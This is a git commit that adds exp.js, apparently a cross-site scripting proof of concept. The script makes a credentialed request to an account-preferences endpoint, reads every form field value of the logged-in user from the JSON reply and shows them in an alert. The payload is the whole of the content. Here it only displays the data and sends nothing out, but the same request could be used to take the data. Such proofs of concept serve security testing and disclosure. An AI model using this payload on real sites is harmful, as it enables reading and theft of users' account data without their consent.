bd49be2e5c9518b35bafb8fa0f6a1cdd852e9ec8
bbpa <57352896+bbpa@users.noreply.github.com>
2023-07-13 16:24:28 +0330

    Create exp.js

---
+++ exp.js
@@ -0,0 +1,14 @@
+let xhr=new XMLHttpRequest()
+xhr.withCredentials=true;
+xhr.open("GET","/account/user/account-preferences?form_api=1");
+xhr.onreadystatechange=()=>{
+if(xhr.readyState==4){
+let jsondata=JSON.parse(xhr.response).content.form.fields;
+let data="";
+for(fields in jsondata){
+data+=fields+": "+jsondata[fields]["fieldValue"]+"\n";
+}
+alert(data)
+}
+}
+xhr.send();''
